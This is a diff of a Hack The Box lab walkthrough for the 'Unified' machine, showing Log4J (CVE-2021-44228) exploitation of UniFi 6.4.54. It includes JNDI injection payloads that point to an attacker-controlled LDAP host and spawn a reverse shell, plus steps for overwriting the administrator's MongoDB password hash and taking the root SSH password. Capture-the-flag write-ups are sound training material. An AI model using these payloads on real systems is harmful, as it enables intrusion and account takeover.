@@ -1,21 +1,32 @@
-# Unified Write-up  
-Prepared by: Sai Teja 
+# Unified – Hack The Box Walkthrough
+**Author:** Sai Teja  
+**Status:** Retired Machine  
+**Difficulty:** Medium  
+**Techniques:** Log4J (CVE-2021-44228), JNDI Injection, Reverse Shell, MongoDB Password Manipulation, Privilege Escalation
 
-## Introduction
+#### 📌 Introduction
 This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring system called "UniFi". This box will show you how to set up and install the necessary packages and tools to exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called `remember`, giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.
 
 ---
 
-## Enumeration
+#### 📌 Enumeration
 The first step is to scan the target IP address with Nmap to check what ports are open. We'll do this with the help of a program called Nmap. Here is a quick explanation of what each flag is and what it does.
 
 - **-sC**: Performs a script scan using the default set of scripts.  
 - **-sV**: Version detection  
-- **-v**: Increases verbosity  
+- **-v**: Increases verbosity
+
+
+<img width="1920" height="526" alt="Screenshot 2026-01-06 13095856" src="https://github.com/user-attachments/assets/e3916ac0-6e3b-47ad-8378-8a3cc6463204" />
 
 The scan reveals port **8080** open running an HTTP proxy. The proxy appears to redirect requests to port **8443**, which seems to be running an SSL web server.
 
 The page title on 8443 is **"UniFi Network"** showing version **6.4.54**.
+
+
+<img width="1073" height="504" alt="Screenshot 2026-01-06 115757" src="https://github.com/user-attachments/assets/9e4d7336-df1f-4832-854d-23eb8d1c3dbe" />
+
+
 
 A Google search for **UniFi 6.4.54 exploit** reveals articles discussing Log4J exploitation in this version.
 
@@ -28,32 +39,38 @@ This vulnerability allows OS command injection.
 
 To test for vulnerability, intercept the login POST request using FoxyProxy + BurpSuite, then modify the `remember` parameter.
 
+
+<img width="582" height="309" alt="Screenshot 2026-01-06 12024756" src="https://github.com/user-attachments/assets/1afaa910-02f7-47e8-976d-8d91620e18f7" />
+
 ---
-<img width="1920" height="1020" alt="Screenshot 2026-01-06 130958" src="https://github.com/user-attachments/assets/61b5c22a-f489-4138-8b82-ad739774f73a" />
 
 
 
 
-## Exploitation
+
+
+#### 📌 Exploitation
 Send incorrect credentials "`test:test`" just to capture the request.
 
 Forward to **Repeater** (Ctrl + R).
 
 Insert JNDI payload into the `remember` parameter.  
+
 Because the POST body is JSON, the payload must be wrapped in quotes so it is parsed as a string:
 
 ```
 "${jndi:ldap://<Your-IP>/whatever}"
 ```
 
+<img width="1077" height="321" alt="Screenshot 2026-01-06 12101046456" src="https://github.com/user-attachments/assets/9181d2b7-4ce2-4f0e-8e0f-5caca8dc972e" />
+
+
+
 Even if the response shows error, the payload may still execute.
 
 
-<img width="582" height="309" alt="Screenshot 2026-01-06 12024756" src="https://github.com/user-attachments/assets/1afaa910-02f7-47e8-976d-8d91620e18f7" />
 
----
-
-### Start tcpdump to detect callback:
+ Start tcpdump to detect callback:
 ```bash
 sudo tcpdump -i tun0 port 389
 ```
@@ -61,11 +78,10 @@ sudo tcpdump -i tun0 port 389
 Send the request > if you see packets → **vulnerable**.
 
 
-<img width="1920" height="1020" alt="Screenshot 2026-01-06 130913" src="https://github.com/user-attachments/assets/ed7da21a-b85a-4eae-8343-6ae9c522af9b" />
 
----
+<img width="1920" height="244" alt="Screenshot 2026-01-06 1309135626" src="https://github.com/user-attachments/assets/9e356e26-0cfb-49d5-ba90-6960866847dc" />
 
-### Install tools needed for full RCE:
+Install tools needed for full RCE:
 - OpenJDK  
 - Maven  
 
@@ -92,7 +108,7 @@ This builds:
 
 ---
 
-## Build Reverse Shell Payload
+#### 📌 Build Reverse Shell Payload
 Base64 encode reverse shell:
 
 ```bash
@@ -118,7 +134,8 @@ Modify Burp payload:
 ${jndi:ldap://<Your-IP>:1389/o=tomcat}
 ```
 
-<img width="892" height="378" alt="Screenshot 2026-01-06 12101056" src="https://github.com/user-attachments/assets/5d12f4cf-2f01-4804-bcef-f70ef42c3297" />
+
+<img width="868" height="413" alt="Screenshot 2026-01-08 112116" src="https://github.com/user-attachments/assets/ede1903d-28b4-45fb-a8ab-7a58b8503ec7" />
 
 Send.  
 Rogue-JNDI receives connection → reverse shell spawns.
@@ -145,7 +162,7 @@ cat user.txt
 
 ---
 
-## Privilege Escalation
+#### 📌 Privilege Escalation
 
 Check MongoDB:
 
@@ -166,7 +183,7 @@ Look for user `"Administrator"` and field `"x_shadow"`.
 
 <img width="1032" height="359" alt="2132123" src="https://github.com/user-attachments/assets/8c1554a0-a33e-4163-87a9-7a4ed875b9e7" />
 
-### Generate SHA-512 password hash:
+ Generate SHA-512 password hash:
 ```bash
 mkpasswd -m sha-512 Password1234
 ```
@@ -190,7 +207,7 @@ Login to UniFi admin panel using your new password.
 
 ---
 
-## Getting Root Password
+#### 📌 Getting Root Password
 Navigate to:
 
 **Settings → Site → SSH Authentication**
@@ -226,5 +243,5 @@ cat /root/root.txt
 
 ---
 
-## End
+#### 📌 End
 Congratulations — you have completed the Unified box.
